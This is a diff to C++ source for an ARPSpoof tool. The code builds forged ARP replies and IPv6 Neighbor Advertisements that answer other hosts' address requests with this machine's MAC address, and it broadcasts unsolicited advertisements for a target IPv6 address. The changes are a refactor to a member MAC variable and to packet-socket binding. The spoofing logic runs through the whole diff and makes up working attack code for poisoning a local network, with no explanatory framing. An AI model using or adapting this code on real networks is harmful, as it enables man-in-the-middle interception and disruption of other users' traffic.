@@ -87,9 +87,18 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
 
     m_IfName = std::string(ifname);
 
-    while(HWAddress(m_IfName.c_str(), HWAddr) == false);
-    while(setsockopt(m_RxSockets[IPV4], SOL_SOCKET, SO_BINDTODEVICE, m_IfName.c_str(), strlen(m_IfName.c_str())) != 0);
-    while(setsockopt(m_RxSockets[IPV6], SOL_SOCKET, SO_BINDTODEVICE, m_IfName.c_str(), strlen(m_IfName.c_str())) != 0);
+    while(HWAddress(m_IfName.c_str(), m_HWAddr) == false);
+    sockaddr_ll sll;
+    memset(&sll, 0, sizeof(sll));
+    sll.sll_family = AF_PACKET; 
+    sll.sll_ifindex = if_nametoindex(m_IfName.c_str());
+    sll.sll_protocol = htons(ETH_P_ARP);
+    while((bind(m_RxSockets[IPV4], (sockaddr*)&sll , sizeof(sll))) ==-1);
+    memset(&sll, 0, sizeof(sll));
+    sll.sll_family = AF_PACKET; 
+    sll.sll_ifindex = if_nametoindex(m_IfName.c_str());
+    sll.sll_protocol = htons(ETH_P_IPV6);
+    while((bind(m_RxSockets[IPV6], (sockaddr*)&sll , sizeof(sll))) ==-1);
     
     timeval rx_to = {1, 0};
     fd_set ReadFD;
@@ -127,7 +136,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
             // make reply packet;
             // ethernet header
             memcpy(TxEthHdr->ether_dhost, RxEthHdr->ether_shost, ETHER_ADDR_LEN);// set destination mac address of reply packet with the source mac address of the request packet.
-            memcpy(TxEthHdr->ether_shost, HWAddr, ETHER_ADDR_LEN);
+            memcpy(TxEthHdr->ether_shost, m_HWAddr, ETHER_ADDR_LEN);
             TxEthHdr->ether_type = htons(ETH_P_ARP);
             // arp header
             TxARPHdr->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); //Format of hardware address
@@ -135,7 +144,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
             TxARPHdr->ea_hdr.ar_hln = ETHER_ADDR_LEN; //Length of hardware address.
             TxARPHdr->ea_hdr.ar_pln = IP_ADDR_LEN; //Length of protocol address.
             TxARPHdr->ea_hdr.ar_op = htons(ARPOP_REPLY); //ARP operation : REPLY
-            memcpy(TxARPHdr->arp_sha, HWAddr, ETHER_ADDR_LEN);// set source mac address of the reply packet with mac address of this machine.
+            memcpy(TxARPHdr->arp_sha, m_HWAddr, ETHER_ADDR_LEN);// set source mac address of the reply packet with mac address of this machine.
             memcpy(TxARPHdr->arp_spa, RxARPHdr->arp_tpa, IP_ADDR_LEN);// set source IP address of the reply packet with the target IP address of the request packet.
             memcpy(TxARPHdr->arp_tha, RxEthHdr->ether_shost, ETHER_ADDR_LEN);// set target mac address with the source mac address of the request packet.
             memcpy(TxARPHdr->arp_tpa, RxARPHdr->arp_spa, IP_ADDR_LEN);// set target IP address of the reply packet with the source IP address of the request packet.
@@ -143,7 +152,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
             memset(&ifaddr, 0, sizeof(ifaddr));
             ifaddr.sll_ifindex = if_nametoindex(m_IfName.c_str()); //Interface number
             ifaddr.sll_family = AF_PACKET;
-            memcpy(ifaddr.sll_addr, HWAddr, ETHER_ADDR_LEN); //Physical layer address
+            memcpy(ifaddr.sll_addr, m_HWAddr, ETHER_ADDR_LEN); //Physical layer address
             ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address
             if(ARP_LEN != sendto(m_TxSocket, m_TxBuffer, ARP_LEN, 0, (struct sockaddr *) &ifaddr, sizeof(ifaddr)))
             {
@@ -173,7 +182,6 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
                 char src_ip_str[64];
                 char dst_ip_str[64];
                 char target_ip_str[64];
-                std::cout<<"ND_NEIGHBOR_SOLICIT"<<std::endl;
                 if(inet_ntop(AF_INET6, IPv6Hdr->ip6_src.s6_addr	, src_ip_str, INET6_ADDRSTRLEN) != nullptr)
                 {
                     std::cout<<"IP   Src "<<src_ip_str<<std::endl;
@@ -220,7 +228,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
                     sockaddr_ll ifaddr;
 
                     memcpy(TxEthHdr->ether_dhost, RxEthHdr->ether_shost, ETHER_ADDR_LEN);// set destination mac address of reply packet with the source mac address of the request packet.
-                    memcpy(TxEthHdr->ether_shost, HWAddr, ETHER_ADDR_LEN);
+                    memcpy(TxEthHdr->ether_shost, m_HWAddr, ETHER_ADDR_LEN);
                     TxEthHdr->ether_type = htons(ETH_P_IPV6);
 
                     TxIPv6Hdr->ip6_ctlun.ip6_un1 = IPv6Hdr->ip6_ctlun.ip6_un1;
@@ -234,14 +242,14 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
                     TxNeighborAdvert->nd_na_target = NeighborSolicit->nd_ns_target;
                     TxLinkLayerAddress->Type = Target_Link_Layer_Address;
                     TxLinkLayerAddress->Length = 1;
-                    memcpy(TxLinkLayerAddress->Address, HWAddr, 6);
+                    memcpy(TxLinkLayerAddress->Address, m_HWAddr, 6);
                     // Calcuate Checksum
                     TxNeighborAdvert->nd_na_cksum = ICMPChecksum(TxIPv6Hdr);
                     
                     memset(&ifaddr, 0, sizeof(ifaddr));
                     ifaddr.sll_ifindex = if_nametoindex(m_IfName.c_str()); //Interface number
                     ifaddr.sll_family = AF_PACKET;
-                    memcpy(ifaddr.sll_addr, HWAddr, ETHER_ADDR_LEN); //Physical layer address
+                    memcpy(ifaddr.sll_addr, m_HWAddr, ETHER_ADDR_LEN); //Physical layer address
                     ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address
 
                     if((int)(sizeof(ether_header)+sizeof(ip6_hdr)+ntohs(TxIPv6Hdr->ip6_plen)) != 
@@ -314,7 +322,7 @@ void ARPSpoof::SendNeighborAdvertisement()
     memset(m_TxBuffer, 0, sizeof(m_TxBuffer));
 
     memcpy(TxEthHdr->ether_dhost, BroadcastHWAddr, ETHER_ADDR_LEN);// set destination mac address of reply packet with the source mac address of the request packet.
-    memcpy(TxEthHdr->ether_shost, HWAddr, ETHER_ADDR_LEN);
+    memcpy(TxEthHdr->ether_shost, m_HWAddr, ETHER_ADDR_LEN);
     TxEthHdr->ether_type = htons(ETH_P_IPV6);
 
     TxIPv6Hdr->ip6_vfc  |= (0x60 & 0xf0);
@@ -331,14 +339,14 @@ void ARPSpoof::SendNeighborAdvertisement()
     memcpy(&TxNeighborAdvert->nd_na_target, TargetIPAddress, 16);
     TxLinkLayerAddress->Type = Target_Link_Layer_Address;
     TxLinkLayerAddress->Length = 1;
-    memcpy(TxLinkLayerAddress->Address, HWAddr, 6);
+    memcpy(TxLinkLayerAddress->Address, m_HWAddr, 6);
     // Calcuate Checksum
     TxNeighborAdvert->nd_na_cksum = ICMPChecksum(TxIPv6Hdr);
 
     memset(&ifaddr, 0, sizeof(ifaddr));
     ifaddr.sll_ifindex = if_nametoindex(m_IfName.c_str()); //Interface number
     ifaddr.sll_family = AF_PACKET;
-    memcpy(ifaddr.sll_addr, HWAddr, ETHER_ADDR_LEN); //Physical layer address
+    memcpy(ifaddr.sll_addr, m_HWAddr, ETHER_ADDR_LEN); //Physical layer address
     ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address
 
     if((int)(sizeof(ether_header)+sizeof(ip6_hdr)+ntohs(TxIPv6Hdr->ip6_plen)) != 
